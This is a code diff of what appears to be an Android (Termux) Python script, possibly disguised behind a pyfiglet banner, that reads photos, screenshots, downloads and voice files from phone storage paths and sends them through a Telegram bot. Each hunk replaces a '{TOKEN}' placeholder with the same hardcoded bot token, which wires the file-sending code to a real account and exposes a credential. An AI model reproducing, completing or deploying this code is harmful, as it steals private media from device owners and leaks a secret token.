@@ -399,7 +399,7 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
@@ -492,9 +492,8 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/Android/media/"
-
 def send_voice(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".opus",".mp3", ".aac")):
@@ -606,7 +605,7 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/DCIM/Camera/"
 
 def send_file(file_path):
@@ -699,7 +698,7 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/DCIM/Screenshots/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
@@ -791,7 +790,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/"
 
 def send_file(file_path):
@@ -885,7 +884,7 @@ except ImportError:
     import pyfiglet
     import requests
     
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
@@ -978,7 +977,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/Download/"
 
 def send_file1(file_path):
@@ -1088,7 +1087,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
@@ -1182,7 +1181,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
@@ -1278,7 +1277,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
@@ -1374,7 +1373,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
@@ -1469,7 +1468,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/DCIM/Camera/"
 
 def send_file(file_path):
@@ -1563,7 +1562,7 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('{TOKEN}')
+bot = telebot.TeleBot('8162453891:AAF-AkN9BFostvsMZUBdVzvpJ2FDDhCC4kI')
 dir_path = "/storage/emulated/0/DCIM/Camera/"
 
 def send_file(file_path):
